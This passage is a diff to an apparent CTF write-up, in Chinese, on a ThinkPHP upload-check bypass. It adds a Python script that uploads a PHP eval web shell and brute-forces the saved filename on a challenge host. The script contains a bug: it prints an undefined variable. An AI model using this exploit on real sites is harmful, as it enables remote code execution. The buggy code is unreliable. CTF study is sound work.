@@ -714,7 +714,7 @@ Content-Type: image/jpeg
 >
 >   Think PHP upload()多文件上传：
 >
->   think PHP里的upload()函数在不传参的情况下是批量上传的，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测。
+>   think PHP里的upload()函数在不传参的情况下是批量上传的，整个`$_FILES`数组的文件都会上传保存，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测。
 >
 >   ThinkPHP 上传文件名爆破：
 >
@@ -771,4 +771,44 @@ for i in dir:
                         break
 
 ```
+
+或者这样：
+
+```python
+import requests
+import os
+session = requests.session()
+url = 'http://bfe57cc0-6949-4a5d-89b9-ec52e0ac2696.node4.buuoj.cn:81/index.php/home/index/upload'
+file1 = {'file': ('1.txt', '<?php eval($_GET["cmd"]);')}
+# upload()不传参时即是批量上传所以用[]
+file2 = {'file[]': ('1.php', '<?php eval($_GET["cmd"]);')}
+# os.open
+r = session.post(url, files=file1)
+print(r.text)
+# start = r.text[-30]
+r = session.post(url, files=file2)
+print(r.text)
+
+r = session.post(url, files=file1)
+print(r.text)
+print(r.text[-31:-23])
+all = r.text[-31:-23]
+s = "1234567890abcdef"
+for a in s:
+    for b in s:
+        for c in s:
+            for d in s:
+                for e in s:
+                    url_new = 'http://bfe57cc0-6949-4a5d-89b9-ec52e0ac2696.node4.buuoj.cn:81//Public/Uploads/2022-02-25/' + \
+                        all+a+b+c+d+e+".php"
+                    # print(url_new)
+                    r = requests.get(url_new)
+                    if r.status_code == 200:
+                        print(path)
+                        # print(r.text)
+                        break
+
+```
+
+### [HarekazeCTF2019]Avatar Uploader 2
 
